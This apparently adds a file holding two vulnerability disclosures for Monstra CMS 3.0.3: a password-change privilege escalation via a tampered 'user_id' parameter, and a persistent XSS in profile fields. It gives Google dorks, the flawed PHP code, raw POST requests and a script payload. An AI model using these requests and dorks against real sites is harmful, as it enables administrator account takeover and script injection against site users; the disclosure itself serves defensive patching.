@@ -1,0 +1,133 @@
+Exploit Title: Monstra CMS 3.0.3 - Privilege Escalation / Remote Password Change
+Google Dork: intext:"Powered by Monstra"/users/registration
+Date: 2016-03-28
+Exploit Author: Sarim Kiani
+Vendor Homepage: http://monstra.org
+Software Link: http://monstra.org/download
+Version: 3.0.3
+Tested on: Windows OS
+
+==================== TIMELINE ====================
+- Discovery Date: March 16 2016
+- Disclosed to Vendor: March 22 2016
+- Vendor Fixed the Issue: March 27 2016
+==================================================
+
+Bug Tracking ID: Github Issue # 405
+Link: https://github.com/monstra-cms/monstra/issues/405
+
+Application Description: Monstra is a modern light weighted Content Management System written in php.
+
+1. Vulnerability Description:
+
+Any user can change credentials of other users including the Administrator credentials. This can allow the attacker to gain Administrator access and completely compromise the application.
+
+Once logged in as a regular user or successfully registering as a new user, use the following URL to gain information (username) of other users:
+http://localhost/monstra-3.0.3/users/1
+
+The digit '1' is of Admin or first user created in the database. By changing the digit, all registered usernames can be found.
+
+Then by using the 'Edit Profile' option of own user account, password of any other user including the Administrator can be changed by changing the POST parameters 'user_id', 'login' and 'new_password'.
+
+
+2. Proof of Concept/Code Flaw:
+
+`In file monstra\plugins\box\users\users.plugin.php
+
+Function: getProfileEdit
+
+Line No: 233
+
+  if (Users::$users->update(Request::post('user_id'),
+        array('login' => Security::safeName(Request::post('login')),
+              'firstname' => Request::post('firstname'),
+              'lastname'  => Request::post('lastname'),
+              'email'     => Request::post('email'),
+              'skype'     => Request::post('skype'),
+              'about_me'  => Request::post('about_me'),
+              'twitter'   => Request::post('twitter')))) {
+
+            // Change password
+            if (trim(Request::post('new_password')) != '') {
+                Users::$users->update(Request::post('user_id'), array('password' => Security::encryptPassword(trim(Request::post('new_password')))));
+            }
+
+            Notification::set('success', __('Your changes have been saved.', 'users'));
+            Request::redirect(Site::url().'/users/'.$user['id']);
+
+On editing profile user id is taken from Request::post('user_id'). An attacker can provide any user id on change password funcionality
+
+Users::$users->update --> updates the password`
+
+Header:
+
+> POST /monstra-3.0.3/users/8/edit HTTP/1.1
+Host: localhost
+Content-Length: 152
+Cache-Control: max-age=0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Origin: http://localhost
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/48.0.2564.116 Safari/537.36
+Content-Type: application/x-www-form-urlencoded
+Referer: http://localhost/monstra-3.0.3/users/8/edit
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Cookie: COOKIE_SUPPORT=true; GUEST_LANGUAGE_ID=en_US; has_js=1; PHPSESSID=abtuklkn1r0rjbub01527gjav0; _ga=GA1.1.592562515.1457951975; login_attempts=i%3A4%3B
+
+csrf=eb616fed8ca93d9de582a4f7d75ee3a3a0d6e3ec&user_id=8&login=user&firstname=&lastname=&email=&twitter=&skype=&about_me=&new_password=&edit_profile=Save
+
+3. Solution:
+
+Vendor has resolved the issue, use the patch 'User Security Fix # 406'.
+
+Link: https://github.com/monstra-cms/monstra/pull/406/commits/2e2a22ee5aafa28771f87c108edea024b618a8d5
+
+##################################################################################
+
+#Exploit Title: Monstra CMS 3.0.3 - Persistent XSS 
+#Google Dork: intext:"Powered by Monstra"
+#Date: 2016-03-16
+#Exploit Author: Sarim Kiani
+#Vendor Homepage: http://monstra.org
+#Software Link: http://monstra.org/download
+#Version: 3.0.3
+#Tested on: Windows OS
+
+
+Monstra is a modern light weighted Content Management System written in php.
+
+
+1. Description
+
+A Persistent XSS exists in the "Edit Profile" page of the application.
+
+
+2. Proof of Concept
+
+Any user entering personal information in the "Edit Profile" page of the application can insert XSS Payload in the Form.
+
+Payload: "><script>alert(1);</script>
+
+The following entries on the page are vulnerable to a Persistent XSS payload:
+
+'Firstname', 'Lastname', 'Email', 'Twitter', 'Skype' and 'About Me'.
+
+POST /monstra-3.0.3/users/8/edit HTTP/1.1
+Host: localhost
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://localhost/monstra-3.0.3/users/8/edit
+Cookie: GUEST_LANGUAGE_ID=en_US; COOKIE_SUPPORT=true; SCREEN_NAME=5374564c7570434448716b3d; SESS7a361a010634612fb69871c3ab2715f1=05e_dlYEnDv4-n3tC89gHEXGp3l-L5CXZY7LNgxFIFg; docebo_session=an9dgdq6rmlg3bv5b29tj45653; PHPSESSID=no30picpa0c5khn86lmcd53cb5; _ga=GA1.1.739562915.1457952544
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 440
+
+csrf=685bba70d144b8b8727937b56f5b87e669135fe1&user_id=8&login=user&firstname=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&lastname=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&email=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&twitter=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&skype=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&about_me=%22%3E%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E&new_password=&edit_profile=Save
+
+
+3.Solution
+
+No newer (fixed) versions are currently available.  
